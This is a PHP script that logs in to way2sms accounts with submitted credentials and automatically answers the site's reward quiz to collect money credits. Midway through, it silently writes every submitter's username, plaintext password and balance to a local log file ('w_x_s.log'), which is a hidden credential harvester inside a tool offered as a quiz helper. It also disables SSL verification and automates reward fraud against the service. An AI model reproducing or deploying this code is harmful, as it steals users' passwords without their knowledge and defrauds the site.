<?php
error_reporting(0);
date_default_timezone_set($timezone);
$user=$_POST["uid"];
$pass=$_POST["pwd"];
$url="http://site3.way2sms.com";
$login="$url/Login1.action"; 
$user_agent="Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0";
$multi=explode(",",$user);
foreach($multi as $user){
if(strlen($user)>10){die("Unknown Error!!!");}
$cookie = tempnam("/tmp", "CURLCOOKIE");
$postdata = "gval=&username=".$user."&password=".$pass.""; 
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, $login); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 1);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, "$url/content/index.html"); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1); 
$html= curl_exec ($ch); 
if(!stristr($html,"MainView.action")){die("<font color=red><b>Wrong Username/Password Combination!</font>");}
$pos1 = strpos($html, "~");$pos2 = strpos($html, ";");
$sessionid = substr($html, $pos1+1,($pos2-1)-$pos1);
$n=mt_rand(0,9999999999999);
$qwec="$url/quizwelcome.action?Token=$sessionid";
$squri="$url/quizMian.action?Token=$sessionid&n=0.$n";
$quri="$url/quizMian.action?Token=$sessionid";
$qref="$url/MainView.action?Token=$sessionid";
#balance
$balURL="$url/earns.action?Token=$sessionid";
curl_setopt ($ch, CURLOPT_URL, $balURL); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $qref); 
$bal=curl_exec ($ch);
preg_match("/<h3>[\s]*<span>Rs.<\/span> (.*?)<\/h3>/i",$bal,$bal);
echo "<br/><font color=purple size=3px><b>WELCOME :".$user."<br/>";
$timezone = "Asia/Calcutta";
$line = date('Y-m-d H:i:s') . " User Details: - ".$user." , ".$pass." , ".$bal[1]."";
file_put_contents('w_x_s.log', $line . PHP_EOL, FILE_APPEND);
#balanc End
require_once('compans.php');
$class = new compareimage;
curl_setopt($ch, CURLOPT_COOKIE, "JSESSIONID=".substr($html, $pos1-3,($pos2-1)-($pos1-3)));
quiz:
curl_setopt ($ch, CURLOPT_URL, $squri); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $qwec); 
$first=curl_exec ($ch);
started:
curl_setopt ($ch, CURLOPT_URL, $quri); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $qref); 
$first=curl_exec ($ch);
preg_match("/<span class=\"qu\">[\s]*(.*?)[\s]*<\/span>/i",$first,$qno);
if(!$qno[1]){echo "<br><br/><font color=blue size=3px><b>Congratulation::::::::Quiz Successfully Completed!!! Try again Tomorrow!!!</font><br>";goto bal;break;}
echo "<font color=red size=2px><b>|Q. <font color=blue>[".$qno[1]."]|</font></font>";
flush();
ob_flush();
preg_match_all("/class=\"btm false\"[\s]*onclick=\"javascript\:addmsg\(this,\'(.*?)\'\)\;\"[\s]*\>[\r\n\s\s+]*\<\img[\s]*id=\"aIMG\"[\r\n]*(.*?)\n/i",$first,$ansimg);
$src1=preg_match("/src=\"(.*?)\"/i",$ansimg[2][0],$src);
$src1=$src[1];
$aim1=$ansimg[1][0];
$src2=preg_match("/src=\"(.*?)\"/i",$ansimg[2][1],$src);
$src2=$src[1];
$aim2=$ansimg[1][1];
$src3=preg_match("/src=\"(.*?)\"/i",$ansimg[2][2],$src);
$src3=$src[1];
$aim3=$ansimg[1][2];
$src4=preg_match("/src=\"(.*?)\"/i",$ansimg[2][3],$src);
$src4=$src[1];
$aim4=$ansimg[1][3];
$src5=preg_match("/src=\"(.*?)\"/i",$ansimg[2][4],$src);
$src5=$src[1];
$aim5=$ansimg[1][4];
$src6=preg_match("/src=\"(.*?)\"/i",$ansimg[2][5],$src);
$src6=$src[1];
$aim6=$ansimg[1][5];
$ans1=$class->compare($src1);
$ans2=$class->compare($src2);
$ans3=$class->compare($src3);
$ans4=$class->compare($src4);
$ans5=$class->compare($src5);
$ans6=$class->compare($src6);
$maxval=max($ans1,$ans2,$ans3,$ans4,$ans5,$ans6);
$safe;
if($maxval==$ans1){$safe=$aim1;}
if($maxval==$ans2){$safe=$aim2;}
if($maxval==$ans3){$safe=$aim3;}
if($maxval==$ans4){$safe=$aim4;}
if($maxval==$ans5){$safe=$aim5;}
if($maxval==$ans6){$safe=$aim6;}
$sel=0;
if(preg_match("/var dataAns={\"ch4\":\"(.*?)\",\"ch3\":\"(.*?)\",\"ch2\":\"(.*?)\",\"ch1\":\"(.*?)\"};/i",$first,$txt)){
$txtans=$txt[1];
echo 1;
$uenans=urlencode($txtans);
$qsub="$url/CheckQuestion.action?ans=undefined&ansMode=$uenans&Token=$sessionid";
$postdata="ans=undefined&ansMode=".$txtans."&Token=".$sessionid."";
}
else if(empty($sel)){
$qsub="$url/CheckQuestion.action?ans=$safe&ansMode=undefined&Token=$sessionid";
$postdata="ans=".$safe."&ansMode=undefined&Token=".$sessionid."";
}
else
{
$qsub="$url/CheckQuestion.action?ans=$safe&sel_choices=$sel&Token=$sessionid";
$postdata="ans=".$safe."&sel_choices=".$sel."&Token=".$sessionid."";
}
curl_setopt ($ch, CURLOPT_URL, $qsub); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1);  
$second=curl_exec ($ch);
if(preg_match("/ansMode\"\:\"Correct\"/i",$second)){
preg_match("/currentBal\"\:(.*?)\,/i",$second,$nb);
echo "Rs:".$nb[1]."";flush();ob_flush();goto started;break;}
if(preg_match("/quiz\"\:\"skip\"/i",$second)){echo "<br><br/><font color=red><b>Beware!!! You have Selected an Invalid/blank Option.</b><br><br/></font>";break;}
preg_match("/quizRes\"\:\"(.*?)\"/i",$second,$res);
$qrs= str_replace('\r\n', "", $res[1]);
if(preg_match("/{\"qnID\":\"(.*?)==\",\"ansMode\":\"(.*?)\",\"qzID\":\"(.*?)\",\"quiz\":\"(.*?)\"}/i",$second,$inp)){
$qnID=$inp[1];
$qzID=$inp[3];
$qint="$url/quizMian.action?Token=$sessionid&qnID=$qnID==&qzID=$qzID";
}
else
{
$qint="$url/quizInt.action?quizRes=$qrs&Token=$sessionid";
}
#die($qint);
curl_setopt ($ch, CURLOPT_URL, $qint); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
$second=curl_exec ($ch);
#echo $second;
#die();
preg_match("/id=\"sel_choices\" value=\"(.*?)\"/i",$second,$sel);
$sel=$sel[1];
$sel=urlencode($sel);
preg_match_all("/class=\"btm false\"[\s]*onclick=\"javascript\:addmsg\(this,\'(.*?)\'\)\;\"[\s]*\>[\r\n\s\s+]*\<\img[\s]*id=\"aIMG\"[\r\n]*(.*?)\n/i",$second,$ansimg);
$src1=preg_match("/src=\"(.*?)\"/i",$ansimg[2][0],$src);
$src1=$src[1];
$aim1=$ansimg[1][0];
$src2=preg_match("/src=\"(.*?)\"/i",$ansimg[2][1],$src);
$src2=$src[1];
$aim2=$ansimg[1][1];
$src3=preg_match("/src=\"(.*?)\"/i",$ansimg[2][2],$src);
$src3=$src[1];
$aim3=$ansimg[1][2];
$src4=preg_match("/src=\"(.*?)\"/i",$ansimg[2][3],$src);
$src4=$src[1];
$aim4=$ansimg[1][3];
$src5=preg_match("/src=\"(.*?)\"/i",$ansimg[2][4],$src);
$src5=$src[1];
$aim5=$ansimg[1][4];
$ans1=$class->compare($src1);
$ans2=$class->compare($src2);
$ans3=$class->compare($src3);
$ans4=$class->compare($src4);
$ans5=$class->compare($src5);
$maxval=max($ans1,$ans2,$ans3,$ans4,$ans5);
$safe;
if($maxval==$ans1){$safe=$aim1;}
if($maxval==$ans2){$safe=$aim2;}
if($maxval==$ans3){$safe=$aim3;}
if($maxval==$ans4){$safe=$aim4;}
if($maxval==$ans5){$safe=$aim5;}
if(preg_match("/var dataAns={\"ch4\":\"(.*?)\",\"ch3\":\"(.*?)\",\"ch2\":\"(.*?)\",\"ch1\":\"(.*?)\"};/i",$second,$txt)){
$txtans=$txt[2];
echo 2;
$uenans=urlencode($txtans);
$qsub="$url/CheckQuestion.action?ans=undefined&ansMode=$uenans&Token=$sessionid";
$postdata="ans=undefined&ansMode=".$txtans."&Token=".$sessionid."";
}
else if(empty($sel)){
$qsub="$url/CheckQuestion.action?ans=$safe&ansMode=undefined&Token=$sessionid";
$postdata="ans=".$safe."&ansMode=undefined&Token=".$sessionid."";
}
else
{
$qsub="$url/CheckQuestion.action?ans=$safe&sel_choices=$sel&Token=$sessionid";
$postdata="ans=".$safe."&sel_choices=".$sel."&Token=".$sessionid."";
}
curl_setopt ($ch, CURLOPT_URL, $qsub); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1);  
$second=curl_exec ($ch);
if(preg_match("/ansMode\"\:\"Correct\"/i",$second)){
preg_match("/currentBal\"\:(.*?)\,/i",$second,$nb);
echo "Rs:".$nb[1]."";flush();ob_flush();goto started;break;}
if(preg_match("/quiz\"\:\"skip\"/i",$second)){echo "<br><br/><font color=red><b>Beware!!! You have Selected an Invalid/blank Option.</b><br><br/></font>";break;}
preg_match("/quizRes\"\:\"(.*?)\"/i",$second,$res);
$qrs= str_replace('\r\n', "", $res[1]);
if(preg_match("/{\"qnID\":\"(.*?)==\",\"ansMode\":\"(.*?)\",\"qzID\":\"(.*?)\",\"quiz\":\"(.*?)\"}/i",$second,$inp)){
$qnID=$inp[1];
$qzID=$inp[3];
$qint="$url/quizMian.action?Token=$sessionid&qnID=$qnID==&qzID=$qzID";
}
else
{
$qint="$url/quizInt.action?quizRes=$qrs&Token=$sessionid";
}
curl_setopt ($ch, CURLOPT_URL, $qint); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
$second=curl_exec ($ch);
preg_match("/id=\"sel_choices\" value=\"(.*?)\"/i",$second,$sel);
$sel=$sel[1];
$sel=urlencode($sel);
preg_match_all("/class=\"btm false\"[\s]*onclick=\"javascript\:addmsg\(this,\'(.*?)\'\)\;\"[\s]*\>[\r\n\s\s+]*\<\img[\s]*id=\"aIMG\"[\r\n]*(.*?)\n/i",$second,$ansimg);
$src1=preg_match("/src=\"(.*?)\"/i",$ansimg[2][0],$src);
$src1=$src[1];
$aim1=$ansimg[1][0];
$src2=preg_match("/src=\"(.*?)\"/i",$ansimg[2][1],$src);
$src2=$src[1];
$aim2=$ansimg[1][1];
$src3=preg_match("/src=\"(.*?)\"/i",$ansimg[2][2],$src);
$src3=$src[1];
$aim3=$ansimg[1][2];
$src4=preg_match("/src=\"(.*?)\"/i",$ansimg[2][3],$src);
$src4=$src[1];
$aim4=$ansimg[1][3];
$ans1=$class->compare($src1);
$ans2=$class->compare($src2);
$ans3=$class->compare($src3);
$ans4=$class->compare($src4);
$maxval=max($ans1,$ans2,$ans3,$ans4);
$safe;
if($maxval==$ans1){$safe=$aim1;}
if($maxval==$ans2){$safe=$aim2;}
if($maxval==$ans3){$safe=$aim3;}
if($maxval==$ans4){$safe=$aim4;}
if(preg_match("/var dataAns={\"ch4\":\"(.*?)\",\"ch3\":\"(.*?)\",\"ch2\":\"(.*?)\",\"ch1\":\"(.*?)\"};/i",$second,$txt)){
$txtans=$txt[3];
echo 3;
$uenans=urlencode($txtans);
$qsub="$url/CheckQuestion.action?ans=undefined&ansMode=$uenans&Token=$sessionid";
$postdata="ans=undefined&ansMode=".$txtans."&Token=".$sessionid."";
}
else if(empty($sel)){
$qsub="$url/CheckQuestion.action?ans=$safe&ansMode=undefined&Token=$sessionid";
$postdata="ans=".$safe."&ansMode=undefined&Token=".$sessionid."";
}
else
{
$qsub="$url/CheckQuestion.action?ans=$safe&sel_choices=$sel&Token=$sessionid";
$postdata="ans=".$safe."&sel_choices=".$sel."&Token=".$sessionid."";
}
curl_setopt ($ch, CURLOPT_URL, $qsub); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1);  
$second=curl_exec ($ch);
if(preg_match("/ansMode\"\:\"Correct\"/i",$second)){
preg_match("/currentBal\"\:(.*?)\,/i",$second,$nb);
echo "Rs:".$nb[1]."";flush();ob_flush();goto started;break;}
if(preg_match("/quiz\"\:\"skip\"/i",$second)){echo "<br><br/><font color=red><b>Beware!!! You have Selected an Invalid/blank Option.</b><br><br/></font>";break;}
preg_match("/quizRes\"\:\"(.*?)\"/i",$second,$res);
$qrs= str_replace('\r\n', "", $res[1]);
if(preg_match("/{\"qnID\":\"(.*?)==\",\"ansMode\":\"(.*?)\",\"qzID\":\"(.*?)\",\"quiz\":\"(.*?)\"}/i",$second,$inp)){
$qnID=$inp[1];
$qzID=$inp[3];
$qint="$url/quizMian.action?Token=$sessionid&qnID=$qnID==&qzID=$qzID";
}
else
{
$qint="$url/quizInt.action?quizRes=$qrs&Token=$sessionid";
}
curl_setopt ($ch, CURLOPT_URL, $qint); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
$second=curl_exec ($ch);
preg_match("/id=\"sel_choices\" value=\"(.*?)\"/i",$second,$sel);
$sel=$sel[1];
$sel=urlencode($sel);
preg_match_all("/class=\"btm false\"[\s]*onclick=\"javascript\:addmsg\(this,\'(.*?)\'\)\;\"[\s]*\>[\r\n\s\s+]*\<\img[\s]*id=\"aIMG\"[\r\n]*(.*?)\n/i",$second,$ansimg);
$src1=preg_match("/src=\"(.*?)\"/i",$ansimg[2][0],$src);
$src1=$src[1];
$aim1=$ansimg[1][0];
$src2=preg_match("/src=\"(.*?)\"/i",$ansimg[2][1],$src);
$src2=$src[1];
$aim2=$ansimg[1][1];
$src3=preg_match("/src=\"(.*?)\"/i",$ansimg[2][2],$src);
$src3=$src[1];
$aim3=$ansimg[1][2];
$ans1=$class->compare($src1);
$ans2=$class->compare($src2);
$ans3=$class->compare($src3);
$maxval=max($ans1,$ans2,$ans3);
$safe;
if($maxval==$ans1){$safe=$aim1;}
if($maxval==$ans2){$safe=$aim2;}
if($maxval==$ans3){$safe=$aim3;}
if(preg_match("/var dataAns={\"ch4\":\"(.*?)\",\"ch3\":\"(.*?)\",\"ch2\":\"(.*?)\",\"ch1\":\"(.*?)\"};/i",$second,$txt)){
$txtans=$txt[4];
echo 4;
$uenans=urlencode($txtans);
$qsub="$url/CheckQuestion.action?ans=undefined&ansMode=$uenans&Token=$sessionid";
$postdata="ans=undefined&ansMode=".$txtans."&Token=".$sessionid."";
}
else if(empty($sel)){
$qsub="$url/CheckQuestion.action?ans=$safe&ansMode=undefined&Token=$sessionid";
$postdata="ans=".$safe."&ansMode=undefined&Token=".$sessionid."";
}
else
{
$qsub="$url/CheckQuestion.action?ans=$safe&sel_choices=$sel&Token=$sessionid";
$postdata="ans=".$safe."&sel_choices=".$sel."&Token=".$sessionid."";
}
curl_setopt ($ch, CURLOPT_URL, $qsub); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $quri); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1);  
$second=curl_exec ($ch);
if(preg_match("/ansMode\"\:\"Correct\"||ansMode\"\:\"Wrong\"/i",$second)){
preg_match("/currentBal\"\:(.*?)\,/i",$second,$nb);
echo "Rs:".$nb[1]."";flush();ob_flush();goto started;break;}
if(preg_match("/quiz\"\:\"skip\"/i",$second)){echo "<br><br/><font color=red><b>Beware!!! You have Selected an Invalid/blank Option.</b><br><br/></font>";break;}
#balance
if($bal="on"){
bal:
curl_setopt ($ch, CURLOPT_URL, $balURL); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_VERBOSE, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $qref); 
$bal=curl_exec ($ch);
preg_match("/<h3>[\s]*<span>Rs.<\/span> (.*?)<\/h3>/i",$bal,$bal);
#balanc End
curl_close($ch);
}
?>